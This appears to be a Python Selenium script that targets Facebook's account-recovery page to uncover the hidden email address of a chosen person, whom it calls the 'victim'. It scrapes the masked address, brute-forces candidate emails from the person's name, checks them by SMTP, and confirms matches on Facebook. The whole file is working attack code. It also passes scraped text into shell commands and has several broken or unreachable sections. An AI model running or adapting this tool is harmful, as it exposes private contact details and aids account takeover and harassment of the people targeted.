from selenium import webdriver
import random
from time import sleep
from os import system
from pyvirtualdisplay import Display 
from itertools import product
from validate_email import validate_email
import math

#perms = [''.join(p) for p in permutations('abcdefghijklmnopqrstuvwy',2)]
#print(perms)
#valids = validate_email('mail',verify=True)
#print(str(valids))

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



system("clear")
#print bcolors.BOLD
system("tput setaf 3; cat logo.txt")
#print bcolors.ENDC
system("echo  ")
print(bcolors.WARNING+"[:)] This tool only works with accounts that have both email and phone number attached")
nothing=raw_input("[:p] Click Enter to Continue or click CTRL+Z to Quit"+bcolors.WARNING)

print(bcolors.ENDC+bcolors.BOLD+bcolors.FAIL+"[x] Connecting to facebook.."+bcolors.FAIL)


display = Display(visible=0, size=(800, 600))
display.start()
try:
 driver = webdriver.Firefox()
 driver.get("https://m.facebook.com/login/identify/")
 print("\r[:)] Connected !"+bcolors.ENDC+bcolors.FAIL)
 userid=raw_input("[:P] Enter the UserName. For example"+bcolors.BOLD+" Us3rnam3 "+bcolors.ENDC+bcolors.FAIL+"in the URL "+bcolors.BOLD+"https://facebook.com/Us3rnam3 : "+bcolors.ENDC+bcolors.WARNING)
 sleep(1)
 print(bcolors.ENDC+bcolors.BOLD+bcolors.FAIL+"[x] Fetching User data .."+bcolors.ENDC+bcolors.FAIL)


 element = driver.find_element_by_name("email")
 element.send_keys(userid)
 element = driver.find_element_by_id("did_submit")
 element.click()
 sleep(4)
 element = driver.find_element_by_tag_name("strong")
 usr=element.text
 element =  driver.find_element_by_id("objects_container")
 element = element.find_element_by_tag_name("table").text
 system("echo"+" "+"\""+element+"\""+" >> mail.txt")
 system("head -n 2 mail.txt | tail -1 >> email.txt && rm mail.txt ")



 with open('email.txt', 'r') as myfile:
    email=myfile.read().replace('\n', '')
    myfile.close()
 

 print ("[:)] Got User name    : "+bcolors.BOLD+usr+bcolors.ENDC+bcolors.FAIL)
 sleep(1)
 print ("[:)] Got Hidden Email : "+bcolors.BOLD+email+bcolors.ENDC+bcolors.FAIL)
 number=email
 sleep(1)
 try:
  element = driver.find_element_by_xpath('//label[@for="u_0_1"]').text
  system("echo"+" "+"\""+element+"\""+" >> mail.txt")

  num_lines = sum(1 for line in open('mail.txt'))
  line=num_lines-1
  nice_flag=1  # WHAT THE FF IS NICE FLAG
  system("rm email.txt")
 except:
  print(bcolors.WARNING+"[:(] No other Emails attached .."+bcolors.ENDC)
  nice_flag=0
  system("cp email.txt mail.txt")
  system("rm email.txt")
  num_lines=2
  line=1
 i=1
 while (i<num_lines):
	system("head -n "+str((i+1))+" mail.txt | tail -"+str(i)+" >> email"+str(i)+".txt")
	with open('email'+str(i)+'.txt', 'r') as myfile:
	    emails=myfile.read().replace('\n', '')
	    myfile.close()
	i=i+1;
	
        if((i-1) != line):
        	system("rm email"+str(i-1)+".txt")


 text_file = open("email"+str(line)+".txt", "r")
 emails = text_file.readlines()
 emails = [elem.strip().split('\n') for elem in emails]
 i=0
 while(i != (line)):
	print(bcolors.FAIL+"[:O] Got Hidden Email : "+bcolors.BOLD+bcolors.OKGREEN+str(emails[i]).strip('[\']')+bcolors.ENDC+bcolors.FAIL)
	i=i+1
        sleep(1)
 text_file.close()

#emails list code str(emails[i]).strip('[\']')
 if (nice_flag==1):
  print("[:O] Found total "+str(line)+" Emails attached to the account")
  sleep(1)
 system("rm mail.txt") 
 system("rm email"+str(line)+".txt") 



#no need for this code

 gmail="gmail"
 hotmail="hotmail"
 yahoo="yahoo"
 flag="none"

 print (bcolors.BOLD+"[x] Checking Information.."+bcolors.ENDC+bcolors.OKGREEN)
 sleep(1)
 #driver.get("https://m.facebook.com/login/identify/")
 i=0

#mail checking code
 pos=0
 victim_mail=number
 while (i != line and victim_mail != number):
  if (str(emails[i]).strip('[\']').find(gmail)>=0):
   #print("[x] EMail " + str(i+1) + " is a GMail")
   flag="gmail"
   pos=i
  if (str(emails[i]).strip('[\']').find(yahoo)>=0):
   #print("[x] EMail " + str(i+1) + " is a Yahoo Mail")
   flag="yahoo"
   pos=i
  if (str(emails[i]).strip('[\']').find(hotmail)>=0):
   #print("[x] EMail " + str(i+1) + " is a HotMail")
   flag="hotmail"
   pos=i
  i=i+1
 victim_mail=str(emails[pos]).strip('[\']')
 i=0

#logic
 victim_user_name=victim_mail.rsplit("@")
 victim_user_name=str(victim_user_name[0]).strip('[\']')
 victim_letter_count=len(str(victim_user_name))
 first_letter=str(victim_user_name)[:1]
 first_letter=first_letter.lower()
 last_letter=str(victim_user_name)[-1]
 last_letter=last_letter.lower() #CONTINUE
 #print("[] Guessing the hidden letters of "+victim_user_name)
 nflag=0
 if(first_letter == userid[:1] and last_letter == userid[-1] and victim_letter_count == len(userid)):
  print("[] Checking Email : "+userid+"@"+flag+".com")
  
  is_valid = validate_email(userid+"@"+flag+".com",verify=True)
  if(is_valid == True):
   found_email=userid+"@"+flag+".com"
   driver.get("https://m.facebook.com/login/identify/")
   sleep(2)
   element=driver.find_element_by_id("login_identify_search_placeholder")
   element.send_keys(found_email)
   element=driver.find_element_by_id("did_submit")
   element.click()
   sleep(3)
   element = driver.find_element_by_xpath('//label[@for="u_0_0"]').text
   element=str(element)
   system("echo"+" "+"\""+element+"\""+" >> check.txt")
   system("head -n 2 check.txt | tail -1 >> mail.txt && rm check.txt ")
   with open('mail.txt', 'r') as myfile:
    check=myfile.read().replace('\n', '')
    myfile.close()
    system("rm mail.txt")
   check=str(check)
#   print number
   if(check[-1] ==  number[-1] and check[-2] == number[-2]):
    print("[] Hidden Email is : "+found_email)
    nflag=1
 if(nflag == 0): 
  name_list=usr.split()
  j=0
  fflag=0
  zflag=1
  name_list_index = []
  for i in range(len(name_list)):
   tmp_name=str(name_list[i]).strip('[\']')
   tmp_name=tmp_name.lower()

   if(first_letter == tmp_name[:1] and last_letter == tmp_name[-1] and victim_letter_count == len(tmp_name)):
     zflag=0
     tmp_name=tmp_name+str(name_list[i+1]).strip('[\']')
     is_valid = validate_email(tmp_name+"@"+flag+".com",verify=True)
     if(is_valid == True):
      driver.get("https://m.facebook.com/login/identify/")
      sleep(2)
      element=driver.find_element_by_id("login_identify_search_placeholder")
      element.send_keys(found_email)
      element=driver.find_element_by_id("did_submit")
      element.click()
      sleep(3)
      element = driver.find_element_by_xpath('//label[@for="u_0_0"]').text
      element=str(element)
      system("echo"+" "+"\""+element+"\""+" >> check.txt")
      system("head -n 2 check.txt | tail -1 >> mail.txt && rm check.txt ")
      with open('mail.txt', 'r') as myfile:
       check=myfile.read().replace('\n', '')
       myfile.close()
       system("rm mail.txt")
      check=str(check)
#      print number
      if(check[-1] ==  number[-1] and check[-2] == number[-2]):
       print("[] Hidden Email is : "+found_email)
       nflag=1
   elif(first_letter == tmp_name[:1] and nflag == 0):
  #  print("[] Hmm.. The first "+str(len(tmp_name))+" chars may be "+tmp_name)
    name_list_index.append(i)
    j=j+1

    
    
   

#Email Brute force 
  bkb=(victim_letter_count-len(tmp_name))
  if(bkb < 0):
   bkb=bkb*(-1)
  if(last_letter.isdigit() == False):
   bru_str="abcdefghijklmnopqrstuvwxyz"
  if(last_letter.isdigit() == True):
   bru_str="abcdefghijklmnopqrstuvwxyz0123456789"
  if(last_letter.isdigit() == True and bkb < 3):
   bru_str="0123456789"
  if(flag != "none" and nflag == 0):
   print("[:)] Smartforcing "+flag)
#  print("[] Guessing collisions : "+str(len(name_list_index)))
  i=0
  
  while (i != line):
    if (str(emails[i]).strip('[\']').find(gmail)>=0):
     print("[x] EMail " + str(i+1) + " is a GMail")
     flag="gmail"
     pos=i
    if (str(emails[i]).strip('[\']').find(yahoo)>=0):
     print("[x] EMail " + str(i+1) + " is a Yahoo Mail")
     flag="yahoo"
     pos=i
    if (str(emails[i]).strip('[\']').find(hotmail)>=0):
     print("[x] EMail " + str(i+1) + " is a HotMail")
     flag="hotmail"
     pos=i
    i=i+1

    victim_mail=str(emails[pos]).strip('[\']')
    victim_user_name=victim_mail.rsplit("@")
    victim_user_name=str(victim_user_name[0]).strip('[\']')
    victim_letter_count=len(str(victim_user_name))
    if(victim_letter_count < 0):
     victim_letter_count=victim_letter_count*(-1)
   
    first_letter=str(victim_user_name)[0]
    first_letter=first_letter.lower()
    last_letter=str(victim_user_name)[-1]
    last_letter=last_letter.lower() #CONTINUE
    len_name_list_index=len(name_list_index)
           
          
           
           
           
           
           
          
         
          
     
    for a in range(len_name_list_index):
         col = name_list_index[a]
         tmp_name=str(name_list[col]).strip('[\']')
         tmp_name=tmp_name.lower()
         f=1
         aka=100
         if(len(tmp_name)+len(str(name_list[col+1]).strip('[\']')) <= len(victim_user_name)):
  #       print len(victim_user_name)
  #       print victim_user_name
  #       print len(tmp_name)
  #       print tmp_name
  #       print len(str(name_list[col+1]).strip('[\']'))
  #       print str(name_list[col+1]).strip('[\']') 
          aka = len(victim_user_name)-len(tmp_name)-len(str(name_list[col+1]).strip('[\']'))
  #       print aka
         if(aka < 0):
           aka = len(victim_user_name)-len(tmp_name)
         if(first_letter != tmp_name[:1]):
          tmp_name=first_letter
         if(aka > 2):
          try:
           if(len(tmp_name)+len(str(name_list[col+2]).strip('[\']')) <= len(victim_user_name)):
            aka = len(victim_user_name)-len(tmp_name)-len(str(name_list[col+2]).strip('[\']'))
            f=2
            if(aka > 2):
              try:
               if(len(tmp_name) <= len(victim_user_name)):
                aka=len(victim_user_name)-len(tmp_name)
                print("[:)] Using First Name ")
                f=0
              except:
               print("[:(] No Names are Matching")
            if(f==2):
             print("[:D] Using Third Name")
          except:
           print("[:D] Using Second Name")
         if(aka == 100):
           aka = len(victim_user_name)-len(tmp_name)
        # if(1==1):#i dont know why i did this line ..fuck
         if(first_letter == tmp_name[:1] and aka < 4  and last_letter.isdigit() == True):
           tmp_name=tmp_name+(str(name_list[col+f]).strip('[\']'))
           bru_str="0123456789" # Remove this line to check for all possibilities
         if(first_letter == tmp_name[:1] and aka < 4  and last_letter.isdigit() != True):
           tmp_name=tmp_name+(str(name_list[col+f]).strip('[\']'))
           bru_str="abcdefghijklmnopqrstuvwxyz" # Remove this line to check for all possibilities
         if(first_letter == tmp_name[0] and aka == 0  and last_letter.isdigit() != True):
           found_email=tmp_name+"@"+flag+".com"
           print("[x] Checking Email")
           is_valid = validate_email(found_email,verify=True) 

           if(is_valid == True):                            
            print(bcolors.FAIL+"\r[:D] Checking validity of Email : "+found_email+" <--- L3t M3 Ch3ck th1s 0n3"+bcolors.ENDC)
            driver.get("https://m.facebook.com/login/identify/")
            sleep(2)
            element=driver.find_element_by_id("login_identify_search_placeholder")
            element.send_keys(found_email)
            element=driver.find_element_by_id("did_submit")
            element.click()
            sleep(3)
            try:
             element = driver.find_element_by_xpath('//label[@for="u_0_0"]').text
             element=str(element)
             system("echo"+" "+"\""+element+"\""+" >> check.txt")
             system("head -n 2 check.txt | tail -1 >> mail.txt && rm check.txt ")
             with open('mail.txt', 'r') as myfile:
              check=myfile.read().replace('\n', '')
              myfile.close()
              system("rm mail.txt")
             check=str(check)
 #            print number
             if(check ==  number):
              print(bcolors.WARNING+bcolors.BOLD+"[:O] Hidden Email is : "+found_email+bcolors.ENDC+bcolors.OKGREEN)
              break 
              nothing=raw_input("[] Click Enter to continue")
            except:
              print(bcolors.FAIL+"\r[:D] Checking validity of Email : "+found_email+" <--- Nope , its valid but not in facebook"+bcolors.ENDC+bcolors.OKGREEN) 
               
               
          
         if(aka==0):
          brute=0
         if(aka > 0):
          brute=aka-1
         if(brute<0): # why the fuxk did i add this line
          brute = brute*(-1)
         print("[x] Time of Completion Depends on your Internet speed ")
      #  print tmp_name 
         for perms in product(bru_str,repeat=brute):
          perms=''.join(perms)
          found_email=tmp_name+str(perms)+last_letter+"@"+flag+".com"
          print("\r[x] checking validity of Email :"+found_email)
          is_valid = validate_email(found_email,verify=True)      
          if(is_valid == True):
           print(bcolors.FAIL+"\r[:D] Checking validity of Email : "+found_email+" <--- L3t M3 Ch3ck th1s 0n3"+bcolors.ENDC)
           driver.get("https://m.facebook.com/login/identify/")
           sleep(2)
           element=driver.find_element_by_id("login_identify_search_placeholder")
           element.send_keys(found_email)
           element=driver.find_element_by_id("did_submit")
           element.click()
           sleep(3)
           try:
            element = driver.find_element_by_xpath('//label[@for="u_0_0"]').text
            element=str(element)
            system("echo"+" "+"\""+element+"\""+" >> check.txt")
            system("head -n 2 check.txt | tail -1 >> mail.txt && rm check.txt ")
            with open('mail.txt', 'r') as myfile:
             check=myfile.read().replace('\n', '')
             myfile.close()
             system("rm mail.txt")
            check=str(check)
 #           print number
            if(check ==  number):
              print(bcolors.WARNING+bcolors.BOLD+"[:O] Hidden Email is : "+found_email+bcolors.ENDC+bcolors.OKGREEN)
              break 
              nothing=raw_input("[] Click Enter to continue")
           except:
              print(bcolors.FAIL+"\r[:D] Checking validity of Email : "+found_email+" <--- Nope , its valid but not in facebook"+bcolors.ENDC+bcolors.OKGREEN) 
              
                
##############################################################################################################
         
         
         
    if (first_letter != tmp_name[0] and zflag==1):
     #  print tmp_name[:1]
    #  tmp_name = raw_input("[:p] The First letter starts with "+first_letter+"\n[:)] Probabily his Nickname or Something\n[:(] Iam not that intelligent \n[:(] Can You Help me here .. Do Some Social Engineering and Give me his First name :")
    #  try:
       tmp_usr = userid
       zero_flag=0
       if( first_letter != userid[0] and last_letter == userid[-1] and len(userid) < len(victim_user_name)):             
             tmp_usr=tmp_usr.replace('.','')    
             lllp=len(victim_user_name)-len(tmp_usr)
             brute=lllp-1
       if( last_letter != userid[-1]):        
             tmp_usr1,p = tmp_usr.split('.')
             tmp_usr1=str(tmp_usr1).strip("\'][\,")
     #       print tmp_usr1
             if(tmp_usr1[-1] == last_letter ):  
              lllp=len(victim_user_name)-len(tmp_usr1)  
              brute=lllp-1
              zero_flag=1 
                                          
       if(flag == "none"):
        x,y=victim_mail.split("@")
        if(len(y) == 7 and y[0] == "g"):
          domain="@gmx.com"
        if(len(y) == 8 and y[0] == "l"):
          domain="@live.com"
       if(flag != "none"):
          domain="@"+flag+".com" 
     # else: #NO FLAGS
       bru_str="abcdefghijklmnopqrstuvwxyz"
       
       for perms in product(bru_str,repeat=brute):
         perms=''.join(perms)
         if(zero_flag==0):
          found_email = first_letter+perms+tmp_usr+domain
         if(zero_flag==1):
          found_email = first_letter+perms+tmp_usr1+domain
          
         print(bcolors.ENDC+bcolors.FAIL+"\r[x] Checking validity of Email : "+found_email)
          
         is_valid = validate_email(found_email,verify=True)
           
           
            
         if(is_valid == True):
          print(bcolors.BOLD+"\r[:D] Checking validity of Email : "+found_email+" <--- L3t M3 Ch3ck th1s 0n3"+bcolors.ENDC)
          driver.get("https://m.facebook.com/login/identify/")
          sleep(2)
          element=driver.find_element_by_id("login_identify_search_placeholder")
          element.send_keys(found_email)
          element=driver.find_element_by_id("did_submit")
          element.click()
          sleep(3)
          try:
           element = driver.find_element_by_xpath('//label[@for="u_0_0"]').text
           element=str(element)
           system("echo"+" "+"\""+element+"\""+" >> check.txt")
           system("head -n 2 check.txt | tail -1 >> mail.txt && rm check.txt ")
           with open('mail.txt', 'r') as myfile:
            check=myfile.read().replace('\n', '')
            myfile.close()
            system("rm mail.txt")
           check=str(check)
 #          print number
           if(check ==  number):
            print(bcolors.WARNING+bcolors.BOLD+"[:O] Hidden Email is : "+found_email+bcolors.ENDC+bcolors.OKGREEN)
            break 
            nothing=raw_input("[] Click Enter to continue")
          except:
            print(bcolors.FAIL+"\r[:D] Checking validity of Email : "+found_email+" <--- Nope , its valid but not in facebook"+bcolors.ENDC+bcolors.OKGREEN)





###############################################################################################################

################################################# SECRET DELETED CODES 
#  comb=math.factorial(26)/(math.factorial(victim_letter_count-2)*math.factorial(26-victim_letter_count-2))
#  print("[] There are Total "+str(comb)+" possible combinations")
#  print("[] Do you really want to continue ?")

 if(flag == "none" and victim_mail[0] == "+" and number[0] == "+"):
  print("[:D] BruteForcing Mobile Number .. Have a long sleep while I crack the Numbers\n[:(] Currently Works with Indian mobile numbers only")
  driver.get("https://m.facebook.com/login/?email=%2B"+number)
 if(flag == "none" and victim_mail[0] != "+" and number[0] != "+"):
  print("[:(] This version is only a PoC , currenlty  supports gmail,email and hotmail")
 driver.close()
  


except Exception as e:
	driver.close()
	print("[:(] + Error + "+str(e))
        print("[:(] make sure internet is connected ")
	system("touch mail.txt")
	system("rm mail.txt")




